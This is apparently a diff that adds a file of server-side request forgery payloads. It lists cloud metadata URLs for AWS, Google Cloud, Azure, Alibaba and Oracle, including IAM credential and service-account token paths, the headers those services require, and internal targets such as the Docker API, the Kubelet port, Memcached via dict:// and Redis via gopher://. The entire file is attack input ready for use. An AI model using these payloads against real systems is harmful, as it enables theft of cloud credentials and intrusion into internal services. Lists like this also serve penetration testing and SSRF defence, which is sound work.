@@ -1,0 +1,20 @@
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/project/attributes/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure)
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://100.100.100.200/latest/meta-data/ (Alibaba Cloud)
+http://169.254.169.254/opc/v1/instance/ (Oracle Cloud)
+X-aws-ec2-metadata-token-ttl-seconds: 21600
+Metadata-Flavor: Google
+X-Google-Metadata-Request: True
+Metadata: true
+http://127.0.0.1:2375/v1.24/containers/json (Docker socket SSRF)
+http://127.0.0.1:10255/pods (Kubelet read-only port)
+http://localhost:8080/
+dict://127.0.0.1:11211/stat
+gopher://127.0.0.1:6379/_INFO
